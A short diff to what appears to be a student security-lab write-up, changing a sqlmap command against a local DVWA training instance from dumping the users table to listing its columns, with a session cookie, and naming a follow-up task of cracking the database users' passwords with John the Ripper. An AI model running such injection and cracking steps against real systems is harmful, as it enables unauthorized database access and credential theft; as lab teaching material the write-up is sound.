@@ -33,7 +33,7 @@ python sqlmap.py -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Subm
 ## Getting all users information:
 Running injection code :
 ```sh
-python sqlmap.py -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=efp6tollc8ushf113hl3b4b155" --dump -T users --batch
+python sqlmap.py -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=efp6tollc8ushf113hl3b4b155" --columns -T users --batch
 ```
 <img src="https://github.com/letmehear159/IS-Lab/blob/master/users.png" alt="screenShot"><br>
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
